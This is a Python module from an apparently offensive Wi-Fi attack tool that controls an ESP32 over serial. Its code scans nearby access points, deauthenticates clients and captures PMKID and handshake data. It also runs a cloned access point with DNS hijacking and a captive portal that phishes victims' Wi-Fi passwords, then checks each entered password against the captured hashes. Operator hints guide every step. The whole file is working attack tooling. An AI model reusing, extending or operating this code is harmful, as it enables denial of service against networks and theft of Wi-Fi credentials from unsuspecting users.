# -*- coding: utf-8 -*-

# region Description
"""
esp32_event.py: Listens for any event output from ESP32
Author: johndeweyzxc (johndewey02003@gmail.com)
"""
# endregion

from utils import hex_to_int_str, hex_to_ascii
from hash_calc import calculate_pmkid, calculate_mic
from serial import Serial
import time

OUT_RED = "\033[91m"
OUT_YELLOW = "\033[93m"
OUT_GREEN = "\033[92m"
OUT_MAGENTA = "\033[35m"
OUT_CYAN = "\033[36m"
COLOR_RESET = "\033[0m"


INITIALIZATION = 'initialization'
PRE_EXPLOITATION = 'preexploitation'
EXPLOITATION = 'exploitation'


class MicData:
    def __init__(self) -> None:
        self.anonce = ''
        self.m2_data = ''
        self.snonce = ''
        self.mic = ''

    def set_m1(self, anonce: str):
        self.anonce = anonce

    def set_m2(self, m2_data: str, snonce: str, mic: str) -> bool:
        self.m2_data = m2_data
        self.snonce = snonce
        self.mic = mic


class TargetAP:
    def __init__(
        self,
        bssid: str,
        ssid: str,
        name_len: int,
        channel: int,
        rssi: int,
        key_data: str,
        client_mac: str
    ) -> None:
        self.bssid = bssid
        self.ssid = ssid
        self.name_len = name_len
        self.channel = channel
        self.rssi = rssi
        self.key_data = key_data  # PMKID
        self.client_mac = client_mac
        self.mic_data = MicData()  # MIC


class ESP32Event:
    def __init__(self, port: Serial) -> None:
        self.port = port
        self.stage_state = INITIALIZATION

        self.target_ap: TargetAP = TargetAP('', '', 0, 0, 0, '', '')
        # List of nearby access point after performing the 'scan' command
        self.nearby_ap_list: list[TargetAP] = []
        # Clients found after initiating the first deauthentication in pre-exploitation
        self.clients_found: list[str] = []
        self.client_target: str = ''
        # Clients connected to ESP32's clone access point in exploitation
        self.clients_connected: list[str] = []

        self.found_pmkids = {}
        self.found_anonces = {}
        self.found_snonces = {}

        self.broadcast_attack = False

        # Flag whenever the user sets monitor mode capture type into PMKID
        self.pmkid_sniff_target = False
        self.is_target_loaded = False
        self.key_loaded = False
        self.is_pmkid = False
        self.deauthing = False
        self.is_monitor_mode_started = False

    def event_start(self):
        print(f'{OUT_MAGENTA}ESP32 system started...{COLOR_RESET}')

    def event_cmd_parser(self, value_list: list[str]):
        output_event = value_list[1]
        match output_event:
            case 'CURRENT_CMD':
                command = value_list[2]
                print(f'{OUT_MAGENTA}Command: {command}{COLOR_RESET}')
            case 'PARSED_CMD':
                mode = value_list[2]
                ap_channel = value_list[3]
                ap_name_len = value_list[4]
                ap_mac = value_list[5]
                ap_name = value_list[6]
                print(
                    f'{OUT_MAGENTA}Mode: {mode}, Channel: {ap_channel}, Length of Name: {ap_name_len}, MAC: {ap_mac}, Name: {ap_name}{COLOR_RESET}')
            case 'STARTED':
                print(f'{OUT_MAGENTA}Command parser initialized...{COLOR_RESET}')

    def event_exploits(self, value_list: list[str]):
        output_event = value_list[1]
        match output_event:
            case 'DEAUTH_STARTING':
                # print(
                #     f'{OUT_MAGENTA}Starting deauthentication...{COLOR_RESET}')
                self.deauthing = True
            case 'DEAUTH_TARGET':
                ap_mac = value_list[2]
                ap_channel = hex_to_int_str(value_list[3])
                print(
                    f'{OUT_MAGENTA}Deauthenticating clients in {ap_mac} at channel {ap_channel}...{COLOR_RESET}')
            case 'DEAUTH_CLIENT_TARGET':
                client_mac = value_list[2]
                print(
                    f'{OUT_MAGENTA}Client target loaded \'{client_mac}\'...{COLOR_RESET}')
            case 'DNS_HIJACK_STARTED':
                print(f'{OUT_MAGENTA}DNS server started...{COLOR_RESET}')
                print(
                    f'{OUT_GREEN}[HINT] Web captive portal has started, run the command \'exploit deauth\' to force the client to connect to our access point...{COLOR_RESET}')
                print(
                    f'{OUT_GREEN}[HINT] If the client connects to our access point, deauthentication will automatically stop...{COLOR_RESET}')

    def event_wifi_ctl(self, value_list: list[str]):
        output_event = value_list[1]
        match output_event:
            case 'FOUND_APS':
                num_aps = value_list[2]
                num_aps = int(f'0x{num_aps}', 0)
                print(
                    f'{OUT_MAGENTA}Found {num_aps} nearby access points{COLOR_RESET}...')
                print(
                    f'{OUT_GREEN}[HINT] Enter the command \'show\' to show the found access points...{COLOR_RESET}')
                self.nearby_ap_list = []
            case 'SCAN':
                ap_mac = value_list[2]
                ap_name = hex_to_ascii(value_list[3])
                ap_rssi = int(value_list[4])
                ap_channel = int(value_list[5])

                nearby_ap = TargetAP(ap_mac, ap_name, len(
                    ap_name), ap_channel, ap_rssi, '', '')
                self.nearby_ap_list.append(nearby_ap)
            case 'ON_DEVICE_CONNECT':
                if len(self.clients_connected) > 1 and not self.broadcast_attack:
                    print(
                        f'{OUT_RED}[WARNING] A client device \'{value_list[2]}\' has connected other than our target...{COLOR_RESET}')
                self.clients_connected.append(value_list[2])
                print(
                    f'{OUT_MAGENTA}Client \'{value_list[2]}\' has connected to our access point...{COLOR_RESET}')

                # * When a client attempts to connect to AP then stop deauthentication
                if self.deauthing:
                    print(f'{OUT_CYAN}Stopping deauthentication...{COLOR_RESET}')
                    self.port.write('02'.encode())
                    self.deauthing = False
                    print(
                        f'{OUT_GREEN}[HINT] Client should be accessing the web captive portal, now we wait for the password...{COLOR_RESET}')

            case 'ON_DEVICE_DISCONNECT':
                if len(self.clients_connected) == 0:
                    return
                self.clients_connected.remove(value_list[2])
                print(
                    f'{OUT_MAGENTA}Client \'{value_list[2]}\' has disconnected from our access point...{COLOR_RESET}')
            case 'INITIALIZED':
                print(
                    f'{OUT_MAGENTA}Wi-Fi controller initialized...{COLOR_RESET}')
                print(
                    f'{OUT_GREEN}[HINT] Enter the command \'scan\' to scan for nearby access points...{COLOR_RESET}')

    def event_pmkid(self, value_list: list[str]):
        output_event = value_list[1]
        match output_event:
            case 'WRONG_KEY_TYPE':
                key_type = value_list[2]
                print(
                    f'{OUT_MAGENTA}Wrong key type {key_type}{COLOR_RESET}')
            case 'WRONG_OUI':
                oui = value_list[2]
                print(f'{OUT_MAGENTA}Wrong OUI {oui}{COLOR_RESET}')
            case 'WRONG_KDE':
                kde = value_list[2]
                print(f'{OUT_MAGENTA}Wrong KDE {kde}{COLOR_RESET}')
            case 'MSG_1':
                bssid = value_list[2]
                sta_mac = value_list[3]
                pmkid = value_list[4]

                if bssid == self.target_ap.bssid.replace(':', ''):
                    self.target_ap.key_data = pmkid
                    self.target_ap.client_mac = sta_mac
                    self.key_loaded = True
                    self.is_pmkid = True
                    if self.stage_state == PRE_EXPLOITATION:
                        if self.target_ap.client_mac not in self.clients_found:
                            print(
                                f'{OUT_CYAN}Found client \'{self.target_ap.client_mac}\' from network \'{self.target_ap.ssid}\'...{COLOR_RESET}')
                            self.clients_found.append(
                                self.target_ap.client_mac)

                    if self.target_ap.key_data not in self.found_pmkids:
                        # For keeping track of received PMKIDs so it does not cause a spam in the console
                        print(
                            f'{OUT_CYAN}Found PMKID \'{self.target_ap.key_data}\' for \'{self.target_ap.ssid}\' where client is \'{self.target_ap.client_mac}\'...{COLOR_RESET}')
                        self.found_pmkids[self.target_ap.key_data] = self.target_ap.ssid

                    # * When PMKID of target AP is found then stop deauthentication and monitor mode
                    if self.deauthing:
                        time.sleep(3)
                        print(
                            f'{OUT_CYAN}Stopping deauthentication...{COLOR_RESET}')
                        self.port.write('02'.encode())
                        self.deauthing = False
                        time.sleep(.5)
                        print(f'{OUT_CYAN}Stopping monitor mode...{COLOR_RESET}')
                        self.port.write('06'.encode())
                        print(
                            f'{OUT_GREEN}[HINT] Enter the command \'showclient\' to select a client target...{COLOR_RESET}')

    def event_mic(self, value_list: list[str]):
        output_event = value_list[1]
        match output_event:
            case 'MSG_1':
                ap_mac = value_list[2]
                sta_mac = value_list[3]
                anonce = value_list[4]
                mic_ctx = self.target_ap.mic_data

                if ap_mac == self.target_ap.bssid.replace(':', '') and self.deauthing:
                    mic_ctx.anonce = anonce
                    self.target_ap.client_mac = sta_mac
                    mic_ctx.set_m1(anonce)
                    self.is_pmkid = False
                    if self.stage_state == PRE_EXPLOITATION:
                        if self.target_ap.client_mac not in self.clients_found:
                            print(
                                f'{OUT_CYAN}Found client \'{self.target_ap.client_mac}\' from network \'{self.target_ap.ssid}\'...{COLOR_RESET}')
                            self.clients_found.append(
                                self.target_ap.client_mac)

                    if mic_ctx.anonce not in self.found_anonces:
                        # For keeping track of received anonces so it does not cause a spam in the console
                        print(
                            f'{OUT_CYAN}Found MIC anonce \'{mic_ctx.anonce}\' for \'{self.target_ap.ssid}\' where client is \'{self.target_ap.client_mac}\'...{COLOR_RESET}')
                        self.found_anonces[mic_ctx.anonce] = self.target_ap.client_mac

            case 'MSG_2':
                sta_mac = value_list[2]
                ap_mac = value_list[3]

                version = value_list[4]  # Version
                type = value_list[5]  # Type
                length = value_list[6]  # Length
                key_desc_type = value_list[7]  # Key Description Type
                key_info = value_list[8]  # Key Information
                key_len = value_list[9]  # Key Length
                rc = value_list[10]  # Replay Counter
                snonce = value_list[11]  # Snonce
                iv = value_list[12]  # Key IV
                rsc = value_list[13]  # Key RSC
                id = value_list[14]  # Key ID
                mic = value_list[15]  # MIC
                k_d_len = value_list[16]  # Key Data Length
                key_data = value_list[17]  # Key Data

                m2_data = (version + type + length + key_desc_type + key_info + key_len +
                           rc + snonce + iv + rsc + id + ('0' * 32) + k_d_len + key_data)
                target = self.target_ap
                mic_ctx = target.mic_data

                if ap_mac == target.bssid.replace(':', '') and sta_mac == target.client_mac:
                    self.target_ap.mic_data.set_m2(m2_data, snonce, mic)
                    self.key_loaded = True
                    self.is_pmkid = False
                    if self.stage_state == PRE_EXPLOITATION:
                        if self.target_ap.client_mac not in self.clients_found:
                            print(
                                f'{OUT_CYAN}Found client \'{self.target_ap.client_mac}\' from network \'{self.target_ap.ssid}\'...{COLOR_RESET}')
                            self.clients_found.append(
                                self.target_ap.client_mac)

                    if mic_ctx.snonce not in self.found_snonces:
                        # For keeping track of received snonces so it does not cause a spam in the console
                        print(
                            f'{OUT_CYAN}Found MIC snonce \'{mic_ctx.snonce}\' and MIC \'{mic_ctx.mic}\' for \'{self.target_ap.ssid}\' where client is \'{self.target_ap.client_mac}\'...')
                        self.found_snonces[mic_ctx.snonce] = self.target_ap.client_mac

                    # * When MIC anonce of target AP is found then stop deauthentication and monitor mode
                    time.sleep(3)
                    print(f'{OUT_CYAN}Stopping deauthentication...{COLOR_RESET}')
                    self.port.write('02'.encode())
                    self.deauthing = False
                    time.sleep(.5)
                    print(f'{OUT_CYAN}Stopping monitor mode...{COLOR_RESET}')
                    self.port.write('06'.encode())
                    print(
                        f'{OUT_GREEN}[HINT] Enter the command \'showclient\' to select a client target...{COLOR_RESET}')

    def event_web(self, value_list: list[str]):
        output_event = value_list[1]

        match output_event:
            case 'POST_PSK':
                psk = hex_to_ascii(value_list[2])
                pmkid = self.target_ap.key_data
                ssid = self.target_ap.ssid
                bssid = self.target_ap.bssid.replace(':', '')
                sta_mac = self.target_ap.client_mac.replace(':', '')

                anonce = self.target_ap.mic_data.anonce
                snonce = self.target_ap.mic_data.snonce
                m2_data = self.target_ap.mic_data.m2_data
                mic = self.target_ap.mic_data.mic

                if self.is_pmkid:
                    correct_password = calculate_pmkid(
                        pmkid, psk, ssid, bssid, sta_mac)
                    if correct_password:
                        print(
                            f'{OUT_GREEN}[PMKID] Password found: {psk}{COLOR_RESET}')
                        self.port.write('08'.encode())
                        print(
                            f'{OUT_CYAN}Closing our access point...{COLOR_RESET}')
                        time.sleep(1.5)
                        self.port.write('04'.encode())
                        print(
                            f'{OUT_GREEN}[SUCCESSFUL OPERATION] Now enter the command \'restart\' to refresh the system...{COLOR_RESET}')
                    else:
                        print(
                            f'{OUT_CYAN}Incorrect password entered ({psk})...{COLOR_RESET}')
                        self.port.write('09'.encode())
                else:
                    correct_password = calculate_mic(
                        psk, ssid, anonce, snonce, bssid, sta_mac, m2_data, mic)
                    if correct_password:
                        print(
                            f'{OUT_GREEN}[MIC] Password found: {psk}{COLOR_RESET}')
                        self.port.write('08'.encode())
                        print(
                            f'{OUT_CYAN}Closing our access point...{COLOR_RESET}')
                        time.sleep(1.5)
                        self.port.write('04'.encode())
                        print(
                            f'{OUT_GREEN}[SUCCESSFUL OPERATION] Enter the command \'restart\' to refresh the system...{COLOR_RESET}')
                    else:
                        print(
                            f'{OUT_CYAN}Incorrect password entered ({psk})...{COLOR_RESET}')
                        self.port.write('09'.encode())

            case 'POST_INVALID_PSK':
                print(f'{OUT_MAGENTA}Invalid password entered...{COLOR_RESET}')
            case 'GET_ROOT':
                print(f'{OUT_MAGENTA}Client does HTTP request...{COLOR_RESET}')
            case 'SERVER_STOPPED':
                print(f'{OUT_MAGENTA}Web server stopped...{COLOR_RESET}')
            case 'SERVER_STARTED':
                print(f'{OUT_MAGENTA}Web server initialized...{COLOR_RESET}')

    def load_target(self, bssid: str, ssid: str, channel: int, name_len: int, rssi: int):
        self.target_ap.bssid = bssid
        self.target_ap.ssid = ssid
        self.target_ap.channel = channel
        self.target_ap.name_len = name_len
        self.target_ap.rssi = rssi
        self.is_target_loaded = True

    def unload_target(self) -> TargetAP:
        previous_target = self.target_ap
        self.target_ap = TargetAP('', '', 0, 0, 0, '', '')
        self.is_target_loaded = False
        self.key_loaded = False
        self.clients_connected = []
        return previous_target

    def load_client_target(self, client: str):
        self.client_target = client

    def unload_client_target(self):
        self.client_target = ''

    def restart_esp32(self):
        self.stage_state = INITIALIZATION

        self.target_ap = TargetAP('', '', 0, 0, 0, '', '')
        self.nearby_ap_list = []
        self.clients_found = []
        self.client_target = ''
        self.clients_connected = []

        self.found_pmkids = {}
        self.found_anonces = {}
        self.found_snonces = {}

        self.broadcast_attack = False

        self.pmkid_sniff_target = False
        self.is_target_loaded = False
        self.key_loaded = False
        self.is_pmkid = False
        self.deauthing = False
        self.is_monitor_mode_started = False

        self.port.write('0B'.encode())
